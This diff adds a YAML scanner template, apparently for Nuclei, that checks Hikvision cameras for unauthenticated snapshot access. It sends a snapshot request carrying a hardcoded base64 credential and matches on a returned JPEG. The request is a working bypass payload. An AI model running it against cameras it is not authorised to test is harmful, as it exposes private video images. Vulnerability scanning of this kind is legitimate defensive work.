@@ -1,0 +1,25 @@
+id: hikvision-camera-management-bypass-view
+
+info:
+  name: 海康威视摄像头管理后台未授权查看快照
+  author: Master先生
+  severity: high
+  reference:
+    - https://www.seebug.org/vuldb/ssvid-96469
+  tags: hikvision,camera
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/onvif-http/snapshot?auth=YWRtaW46MTEK"
+
+    redirects: false
+
+    matchers-condition: and
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code==200"
+          - "contains(tolower(all_headers), 'content-type: image/jpeg')"
+        condition: and
